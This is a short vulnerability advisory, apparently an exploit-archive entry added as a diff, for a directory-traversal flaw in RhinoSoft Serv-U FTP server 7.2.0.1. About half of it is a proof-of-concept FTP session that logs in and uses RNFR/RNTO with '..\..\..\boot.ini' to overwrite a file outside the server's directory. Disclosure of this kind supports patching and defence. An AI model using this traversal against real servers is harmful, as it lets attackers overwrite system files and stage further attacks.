@@ -1,0 +1,17 @@
+source: http://www.securityfocus.com/bid/31563/info
+
+RhinoSoft Serv-U FTP server is prone to a directory-traversal vulnerability because the application fails to sufficiently sanitize user-supplied input.
+
+Exploiting this issue allows an attacker to write arbitrary files to locations outside of the application's current directory. This could help the attacker launch further attacks.
+
+Serv-U FTP server 7.2.0.1 is vulnerable; other versions may also be affected. 
+
+220 Serv-U FTP Server v7.2 ready...
+user test
+331 User name okay, need password.
+pass test
+230 User logged in, proceed.
+rnfr any_exist_file.ext
+350 File or directory exists, ready for destination name.
+rnto ..\..\..\boot.ini
+250 RNTO command successful. 
